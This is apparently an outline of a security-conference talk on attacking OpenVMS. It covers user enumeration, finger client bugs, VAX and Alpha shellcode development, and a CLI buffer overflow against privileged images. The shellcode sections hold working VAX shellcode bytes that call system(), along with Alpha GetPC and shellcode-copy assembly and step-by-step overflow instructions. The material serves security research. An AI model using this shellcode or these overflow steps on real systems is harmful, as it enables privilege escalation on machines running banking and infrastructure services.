# Hacking OpenVMS

## Authors
- Claes Nyberg
- Christer Öberg
- James Tusini

## Overview of OpenVMS
OpenVMS is a robust and versatile operating system with the following key features:
- Multi-user / Multi-processing
- Virtual memory
- Real-time processing
- Transaction processing

### History of Ownership
- **1978 – 1998**: Digital Equipment Corporation (DEC)
- **1998 – 2001**: Compaq
- **2001 – Present**: Hewlett-Packard (HP)

### Key Facts
- **Aliases**: VAX/VMS, VMS, OpenVMS
- **Not UNIX or Windows NT**: OpenVMS is distinct from both UNIX and Windows NT.
- **Platforms**:
  - VAX
  - Alpha
  - Itanium
- **Security and Reliability**: Known for its high security and reliability, often surpassing macOS.

## Reasons to Hack OpenVMS
1. **Neglected by Attackers**: OpenVMS systems are not frequently targeted, making them an interesting challenge.
2. **Critical Operations**: Used in critical sectors such as:
   - Financial systems (banks, stock exchanges)
   - Infrastructure (railways, electric utilities)
   - Healthcare (NHS, NBS, VA)
   - Manufacturing (Intel)
   - Education
3. **Certified Security**: Certified by the Department of Defense (DoD) for its security.
4. **Challenging and Fun**: The complexity and unique architecture make it a rewarding target for ethical hackers.
5. **Encourages Security Research**: Provides a rich environment for security research and learning.

## Online Access
- **deathrow.vistech.net**: Access to both Alpha and VAX systems.
- **fafnet.dyndns.org**: VAX-only access.
- **testdrive.hp.com**: Access to Itanium systems.

## Getting Your Own System
### Software
- **Hobbyist Program**: Available at [openvmshobbyist.com](http://openvmshobbyist.com). Costs $30 plus a local group subscription fee of $100 (UK).
- **Emulators**:
  - **Personal Alpha**: Available at [emulatorsinternational.com](http://emulatorsinternational.com). Free version available with limited functionality, runs on Windows only.
  - **Charon**: Emulates VAX systems. Demo version available but runs only on OpenVMS/Itanium.
  - **Simh**: Free emulator that runs on most operating systems and emulates VAX.

## User Environment
- **X Window System**
- **Common Desktop Environment (CDE)**
- **DCL (Digital Command Language)**: Default shell/scripting language, case-insensitive, and requires explicit command definitions.
- **CDL (Command Definition Language)**: For defining foreign commands.

## OpenVMS Security
### Incidents
- **Worms**: Notable examples include WANK/Father Christmas, which propagated through DECnet and relied on weak passwords. These were not as technically advanced as the Morris worm.

### Vulnerabilities
- Most reported vulnerabilities are pre-1993.
- Limited disclosure through CERT.
- **Textfiles.com** is a good source for vulnerability details.

### Defenses
- **Survived Defcon9 CTF**: A point of pride for OpenVMS users.
- **Fine-grained Controls**: Users do not need root for everything.
- **Recent Exploits**: Rarely seen, indicating strong security measures.

## Old School VMS Hacking
- **Default Accounts and Weak Passwords**: Common starting points.
- **Important Files**:
  - **VMSIMAGES.DAT**: Determines program privileges.
  - **USERRIGHTS.DAT / SYSUAF.DAT**: Binary format password file.
  - **LOGIN.COM**: User-specific login script.

### WASD Problem
- **Open Source Web Server**: Initial releases had numerous security holes, including directory traversal and ACL bypass. Old versions still exist in the wild.

## Enumerating Users
- **SMTP VRFY/EXPN**
- **Finger Service**
- **Default Accounts**: SYSTEM, FIELDS, etc.
- **RIGHTLIST.DAT / SYSUAF.DAT**
- **SYS$IDTOASC**

## OpenVMS Protection
- **UIC (User Identification Code)**: User/Group ID pair.
- **Privileges**: About 40 different privileges, including MOUNT, OPER, CHEXEC, BYPASS, etc.
- **ACL (Access Control List)**: Fine-grained control over permissions.

## File System
- **Logical Names**: Disk, directory, or file references like SYS$SYSDEVICE, SYS$LOGIN, SYS$SYSTEM.
- **RMS (Record Management Services)**: Record-based indexed files.
- **File Versions**: file.txt;1, file.txt;2, file.txt;3, etc.
- **File Security**:
  - Four permissions: Read, Write, Execute, Delete.
  - Applied to four groups: System, Owner, Group, World.
  - Privileges: BYPASS, READALL, SYSPRV, GRPPRV.
  - ACL: Fine-grained control.

### Example File Permission
```plaintext
DEMO
```

## Finger Client Bugs
- **Bug #1**: Runs with SYSPRV, follows links, and displays .plan and .profile content.
- **Bug #2**: Format string vulnerability in .plan and .project files.

## VAX Architecture
- **Virtual Address eXtension (VAX)**: 32-bit platform with an executable stack and four privilege modes.
- **Programming Documentation**: Available online at [HP's website](http://h71000.www7.hp.com/doc/73final/4515/4515ro_index.html).

### Memory Layout
- **System Space / Kernel**: Shared by all processes (0x80000000 – 0xFFFFFFFF).
- **P1 Space / Control Region**: DCL, stacks, symbol table (0x40000000 – 0x7FFFFFFF).
- **P0 Space / Program Region**: Programs (0x0 – 0x3FFFFFFF).

## Shellcode Development
- **Environment**: Uncomfortable for UNIX users, but NetBSD can be installed in a simh emulator to use familiar tools.
- **VAX Calling Standard**: Arguments pushed in reverse order, function address called, and registers saved according to callee's mask.

### VAX/VMS Libc Shellcode Example
```c
unsigned char shellcode[] = 
    /* calls system() */
"\x01\x01"                                    /* Procedure Entry Mask */
"\x9f\xaf\x16"                              /* pushab  */
"\xd0\x6e\x50"                             /* movl (sp),r0 */
/*NULL terminate command*/
"\x94\xa0\x03"                             /* clrb 0x3(r0) */
"\xd0\x8f\xff\x58\x3d\x05\x50"  /* movl $0x053d58ff,r0 */
/ *do right shift to clear MSB */
"\x78\x8f\xf8\x50\x50"                /* ashl $0xf8,r0,r0 */
"\xfb\x01\x60"                             /* calls $0x1,(r0) */
"\x04"                                           /* ret */
/*  */
"DIR"                                           /* command */
"\x3b";                                          /* Byte that will be nulled */
```

### Tips for Easier Shellcode
- **Exploit Symbols**: Executable and can contain NULL bytes.
- **Finding Service Numbers**: Use a debugger to break on [chmk|chms|chme] instructions.

### Interesting System Services
- **CREPRC**: Create process.
- **SETUAI**: Modify user record.
- **GRANTID**: Grant IDs to processes.

### Morris Worm
- **Stack Overflow in fingerd**: Exploited without worrying about NULL bytes due to the gets() function.

## Alpha Architecture
- **64-bit RISC Architecture**: Programming information available, including on Microsoft's MSDN.
- **Instruction Cache and PALCode**: Non-executable stack, but code in symbols can be executed.

### Alpha/VMS Shellcode
- **C Calling Standard**: Complex, documented in hundreds of pages.
- **Non-exec Stack**: Can execute code in symbols, useful for local exploits.
- **Instruction Cache**: Must be flushed in self-modifying code.

### Calling System Services on Alpha/VMS
- **Arguments Passed in r16 - r21 (a0 – a5)**: Additional arguments passed on the stack.
- **Argument Count in r25**: System service number in r0, return value in r0.
- **chme/chmk/chms Instructions**: Contain NULL bytes, as does the imb instruction.

### Development Environment
- **Personal Alpha**: Does not boot BSD, but Linux can be used.
- **GNU Binutils**: Build with Alpha target.
- **Function Pointers**: Do not work directly on Alpha/OpenVMS, see calling standard for details.

### GetPC() Code
- **Tricky Implementation**: No short, NULL-free jmp forward possible, PC register cannot be read directly.
- **Shellcoders Handbook Solution**:
```assembly
main:
.frame  $sp, 0, $26
lda     $r16, -1000($r30)
back:
bis     $r31, 0x86, $r17
stl $r17, -4($r16)
bsr $r16, back
```

## OpenVMS CLI Overflow
- **Failure to Handle Crafted Command Lines**: Verified on OpenVMS Alpha 8.3 default install.
- **Steps to Exploit**:
  1. Type 511 characters at the CLI prompt.
  2. Press UP-ARROW three times.
  3. Type the return address.
  4. Wait (do not hit return, as it will modify the return address).

### Multiple Targets
- **INSTALL (CMKRNL, PRMGBL, SYSGBL, SHMEM, AUDIT)**
- **TCPIP$* (various privileges)**
- **TELNET (OPER)**

### Shellcode Injection
- **Storage Location**: Command line used in overflow can be executed but has input restrictions.
- **Testing**: Use a telnet client to trigger the bug and test shellcode.

### Process Layout
- **CLI Data and Command Tables**: Analyze core dumps and memory to find suitable locations for shellcode.

### Searching Memory
- **Terminal Settings**: Adjust settings to remove restrictions.
  ```shell
  $ set nocontrol =t
  $ set terminal /eightbit
  $ set terminal /nointerrupt
  ```

### Copying Shellcode
- **Copy.S Example**:
```assembly
.text
.align 4
.globl main
.ent main
# $r26 - pc
# $r27 - Source address (code ends with a NULL quad-word)
# $r28 - Destination address
# $r25 - Return address
# $r7  - Temp
main:
        # Source address + 31000
        lda             $r27, 0x7ae45cf8
        # Destination address (main + 72 + 31000)
        lda             $r28, 31072($r26)
        # Return address
        lda             $r25, -31000($r28)
        # Copy all quad words
        copy:
                ldq             $r7, -31000($r27)
                stq             $r7, -31000($r28)
                # Increase source address
                lda $r27, 30000($r27)
                lda $r27, -29992($r27)
                # Increase destination address
                lda $r28, 30000($r28)
                lda $r28, -29992($r28)
                # Copy again if source data was not zero
                bne             $r7, copy
        # Return/Jump to the copyed code
        ret             ($r25), 1
.end main
```

### Global Logical
- **SDA Reveals System Global Logical**: Can be executed.
  ```shell
  SDA> clue process/logical
  ```

### Demo
- **OpenVMS Alpha CLI Overflow**: Live demonstration.